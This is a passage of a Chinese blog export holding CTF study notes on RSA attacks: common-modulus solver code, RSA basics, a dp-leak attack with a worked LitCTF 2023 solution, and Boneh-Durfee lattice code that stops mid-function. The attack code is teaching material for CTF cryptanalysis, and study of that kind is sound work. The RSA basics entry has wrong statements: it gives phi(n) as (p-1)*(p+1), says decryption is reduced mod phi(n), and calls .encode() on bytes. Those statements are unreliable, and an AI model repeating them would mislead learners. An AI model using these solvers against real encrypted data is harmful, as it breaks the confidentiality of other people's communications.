    <url>/2023/07/09/Crypto/RSA/Rsa%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>共模攻击主要利用的是，同一个明文通过两个互质的e对同一个n取余。（如下）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n)</span><br></pre></td></tr></table></figure></div>

<p>数学上存在一个关系</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">e1*x+e2*y=gcd(e1,e2) <span class="comment">#定有x y满足这个式子</span></span><br></pre></td></tr></table></figure></div>

<p>同时又有(前提 m&lt;n 否则会在取余时丢失数据)</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">(m^e1)^x * (m^e2)^y %n = m^(e1*x+e2*y) %n</span><br><span class="line">  (c1^x) * (c2^y) %n   = m^gcd(e1,e2)  %n</span><br><span class="line"><span class="comment">#如果两边都开gcd(e1,e2)次方则 </span></span><br><span class="line">((c1^x) * (c2^y))^(<span class="number">1</span>/gcd(e1,e2))%n=m %n  </span><br></pre></td></tr></table></figure></div>

<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gongmogongji</span>(<span class="params">c1, c2, e1, e2,n</span>):</span><br><span class="line">	<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">	<span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext,iroot</span><br><span class="line">	gcd,x,y=gcdext(e1,e2)<span class="comment">#求出e1*x+e2*y=gcd(e1,e2)的解</span></span><br><span class="line">	m=iroot((<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n))%n,gcd)[<span class="number">0</span>]<span class="comment">#根据((c1^x) * (c2^y))^(1/gcd(e1,e2))%n=m %n  计算出对应的m</span></span><br><span class="line">	<span class="keyword">return</span> long_to_bytes(m)<span class="comment">#将m转换回bytes数组</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>m&gt;n时</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gongmogongji</span>(<span class="params">c1, c2, e1, e2,n</span>):</span><br><span class="line">    <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">    <span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext,iroot</span><br><span class="line">    gcd,x,y=gcdext(e1,e2)<span class="comment">#求出e1*x+e2*y=gcd(e1,e2)的解</span></span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    m=<span class="built_in">int</span>(iroot((<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n))%n+tmp*n,gcd)[<span class="number">0</span>])<span class="comment">#根据((c1^x) * (c2^y))^(1/gcd(e1,e2))%n=m %n  计算出对应的m</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;DASCTF&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> long_to_bytes(m):</span><br><span class="line">        tmp+=<span class="number">1</span></span><br><span class="line">        m=<span class="built_in">int</span>(iroot((<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n))%n+tmp*n,gcd)[<span class="number">0</span>])<span class="comment">#根据((c1^x) * (c2^y))^(1/gcd(e1,e2))%n=m %n  计算出对应的m</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)<span class="comment">#将m转换回bytes数组</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Crypto</category>
        <category>RSA</category>
      </categories>
  </entry>
  <entry>
    <title>Rsa学习</title>
    <url>/2023/06/29/Crypto/RSA/Rsa%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>参考</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/48994878" >RSA 算法正确性证明 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_theory/" >RSA 介绍 - CTF Wiki (ctf-wiki.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_27765961/article/details/52138622" >(41条消息) 对于RSA算法的一些理解_y&#x3D;0 mod (p-1)&#x2F;gcd(b-1,p-1)_lxp61666666的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_42539194/article/details/118514310" >(41条消息) 【RSA原理2】浅谈–什么是欧拉函数_rsa 欧拉函数是什么_韦_恩的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://zhidao.baidu.com/question/137370991.html" >RSA中，e＊d＝1（mod（p-1）(q-1)）中为什么是mod（p-1）(q-1)而不是modpq？_百度知道 (baidu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="逆元"><a href="#逆元" class="headerlink" title="逆元"></a>逆元</h2><p>互为逆元的两个数可以取消其中一个数做的运算(一个运算中一般只有两个互为逆元的数)如e*d≡1mod(p*q)此处d取消了e做的运算</p>
<p>如果e乘了一个其他的数(a)那么再乘上d的值就是这个其他的数(a)</p>
<p><code>e*a*d=a</code></p>
<h2 id="基本运算"><a href="#基本运算" class="headerlink" title="基本运算"></a>基本运算</h2><p>^符号都是指 指数运算</p>
<p>≡符号指同余,可在≡符号右边的计算式中加入mod(num)表示等式两边取num的模同余 如 a≡b mod(c)</p>
<p>p,q 互不相等的质数(可以称为互素)</p>
<p>e 加密密钥</p>
<p>d 解密密钥</p>
<p>n 用于对加密结果取模,n&#x3D;p*q</p>
<p>phi（n） 用于对解密结果取模(直接用n对解密结果取模必须要求a n为不相等的质数) phi(n)&#x3D;(p-1)*(p+1)</p>
<h3 id="加密运算"><a href="#加密运算" class="headerlink" title="加密运算"></a>加密运算</h3><p>设flag为待加密的字符(明文),ec为已加密的数</p>
<p>一般通过bytes_to_long来转换为数</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag=<span class="string">&#x27;密文&#x27;</span></span><br><span class="line">m=bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))<span class="comment">#此刻就转换为了大数</span></span><br></pre></td></tr></table></figure></div>

<p>通过ec≡m^e( mod n )跟ec &#x3D; m^e(mod n)一样</p>
<p>获得密文</p>
<h3 id="解密运算"><a href="#解密运算" class="headerlink" title="解密运算"></a>解密运算</h3><p>设ed为解密后的数</p>
<p>ed≡m^d(mod phi(n)) 跟ed &#x3D; m^d(mod phi(n))</p>
<p>可通过Crypto.Util.number库的long_to_bytes转化为bytes数组再转化为字符串</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag=long_to_bytes(ed).encode()</span><br></pre></td></tr></table></figure></div>

<h3 id="隐含条件0≤-a-c＜p-q"><a href="#隐含条件0≤-a-c＜p-q" class="headerlink" title="隐含条件0≤ a,c＜p*q"></a>隐含条件0≤ a,c＜p*q</h3><h2 id="python常用库"><a href="#python常用库" class="headerlink" title="python常用库"></a>python常用库</h2><p>gmpy2 <a class="link"   href="https://blog.csdn.net/weixin_43790779/article/details/108473984" >(41条消息) gmpy2常见函数使用_abtgu的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>​	求逆元可用于求e对应的d或者d对应的e</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.invert(e,phi(n))<span class="comment">#e mod n的逆元</span></span><br><span class="line">gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="comment">#值为d </span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Crypto</category>
        <category>RSA</category>
      </categories>
  </entry>
  <entry>
    <title>dp泄露</title>
    <url>/2023/07/19/Crypto/RSA/dp%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<p>dp &#x3D; d%(p-1)</p>
<p>∴dp*e&#x3D;d*e mod(p-1)</p>
<p>∴d*e&#x3D;dp*e+k1*(p-1)  ①</p>
<p>又有e*d &#x3D; 1mod((p-1)*(q-1))</p>
<p>∴e*d&#x3D;k2*(p-1)*(q-1)+1 ②</p>
<p>①带入②得</p>
<p>dp*e+k1*(p-1)&#x3D;k2*(p-1)*(q-1)+1	k1,k2∈Z</p>
<p>dp*e &#x3D;k2*(p-1)*(q-1)+k3*(p-1)+1	k2,k3∈Z</p>
<p>e*dp&#x3D;(k2*(q-1)+k3)*(p-1)+1</p>
<p>∵dp&lt;q-1</p>
<p>∴(k2*(q-1)+k3)&lt;e</p>
<p>设(k2*(q-1)+k3)&#x3D;i</p>
<p>可以通过遍历求出i的值</p>
<p>根据已知条件n&#x3D;p*q,i*(p-1)+1&#x3D;dp*e</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,e):</span><br><span class="line">	<span class="keyword">if</span> (dp*e-<span class="number">1</span>)%i==<span class="number">0</span>:</span><br><span class="line">		p=((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">			q=n//p</span><br><span class="line">			<span class="keyword">if</span> e*dp==i*(p-<span class="number">1</span>)+<span class="number">1</span>:</span><br><span class="line">				d=<span class="built_in">__import__</span>(<span class="string">&#x27;gmpy2&#x27;</span>).invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">				<span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	</span><br></pre></td></tr></table></figure></div>

<p>例题[<a class="link"   href="https://www.nssctf.cn/problem/3973" >LitCTF 2023]P_Leak | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>给了dp,n,c可以直接求</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">e=<span class="number">65537</span></span><br><span class="line"><span class="comment"># m=bytes_to_long(b&#x27;xxxx&#x27;)</span></span><br><span class="line"><span class="comment"># p=getPrime(512)</span></span><br><span class="line"><span class="comment"># q=getPrime(512)</span></span><br><span class="line"><span class="comment"># n=p*q</span></span><br><span class="line"><span class="comment"># phi=(p-1)*(q-1)</span></span><br><span class="line"><span class="comment"># d=inverse(e,phi)</span></span><br><span class="line"><span class="comment"># dp=d%(p-1)</span></span><br><span class="line"><span class="comment"># c=pow(m,e,n)</span></span><br><span class="line"><span class="comment"># print(&quot;dp=&quot;,dp)</span></span><br><span class="line"><span class="comment"># print(&quot;n=&quot;,n)</span></span><br><span class="line"><span class="comment"># print(&quot;c=&quot;,c)</span></span><br><span class="line">dp= <span class="number">5892502924236878675675338970704766304539618343869489297045857272605067962848952532606770917225218534430490745895652561015493032055636004130931491316020329</span></span><br><span class="line">n= <span class="number">50612159190225619689404794427464916374543237300894011803225784470008992781409447214236779975896311093686413491163221778479739252804271270231391599602217675895446538524670610623369953168412236472302812808639218392319634397138871387898452935081756580084070333246950840091192420542761507705395568904875746222477</span></span><br><span class="line">c= <span class="number">39257649468514605476432946851710016346016992413796229928386230062780829495844059368939749930876895443279723032641876662714088329296631207594999580050131450251288839714711436117326769029649419789323982613380617840218087161435260837263996287628129307328857086987521821533565738409794866606381789730458247531619</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">	<span class="keyword">if</span> (dp*e-<span class="number">1</span>)%i==<span class="number">0</span>:</span><br><span class="line">		p=((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">			q=n//p</span><br><span class="line">			<span class="keyword">if</span> e*dp==i*(p-<span class="number">1</span>)+<span class="number">1</span>:</span><br><span class="line">				d=<span class="built_in">__import__</span>(<span class="string">&#x27;gmpy2&#x27;</span>).invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">				<span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;Crypto.Util.number&#x27;</span>, fromlist=[<span class="string">&#x27;*&#x27;</span>]).long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Crypto</category>
        <category>RSA</category>
      </categories>
  </entry>
  <entry>
    <title>e特别大的情况</title>
    <url>/2023/12/17/Crypto/RSA/e%E7%89%B9%E5%88%AB%E5%A4%A7%E7%9A%84%E6%83%85%E5%86%B5/</url>
    <content><![CDATA[<h1 id="Boneh-Durfee-攻击"><a href="#Boneh-Durfee-攻击" class="headerlink" title="Boneh Durfee 攻击"></a>Boneh Durfee 攻击</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct</span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this</span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions</span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span 